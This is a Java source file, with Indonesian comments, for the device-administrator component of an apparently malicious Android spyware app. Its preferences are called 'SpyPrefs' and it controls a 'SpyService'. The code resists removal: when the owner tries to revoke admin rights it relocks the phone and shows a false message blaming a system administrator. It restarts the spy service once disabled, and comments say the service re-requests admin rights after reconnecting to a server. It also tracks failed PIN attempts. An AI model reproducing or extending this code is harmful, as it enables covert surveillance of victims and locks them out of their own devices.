package com.nullx.pp;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;

public class DeviceAdminHelper extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        // Admin aktif — simpan flag
        context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
            .edit().putBoolean("adminEnabled", true).apply();
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // Cek apakah device sedang di-lock
        SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        boolean isLocked = prefs.getBoolean("isLocked", false);
        if (isLocked) {
            // Jika locked, coba lock ulang dan batalkan
            try {
                DevicePolicyManager dpm = (DevicePolicyManager)
                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName comp = new ComponentName(context, DeviceAdminHelper.class);
                if (dpm != null && dpm.isAdminActive(comp)) {
                    dpm.lockNow();
                }
            } catch (Exception ignored) {}
            return "Perangkat sedang dikunci oleh administrator sistem. Hubungi administrator untuk membuka kunci.";
        }
        return "Menonaktifkan akan menghapus proteksi sistem.";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // Admin dinonaktifkan — simpan flag dan restart service
        context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
            .edit().putBoolean("adminEnabled", false).apply();

        // Restart service agar tetap jalan
        Intent svc = new Intent(context, SpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(svc);
        } else {
            context.startService(svc);
        }

        // Re-request device admin setelah 3 detik via service
        // SpyService akan handle re-request saat reconnect ke server
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        // Password salah - tambah cooldown
        SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        int fails = prefs.getInt("pinFails", 0) + 1;
        prefs.edit().putInt("pinFails", fails).apply();
    }

    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
            .edit().putInt("pinFails", 0).apply();
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }
}
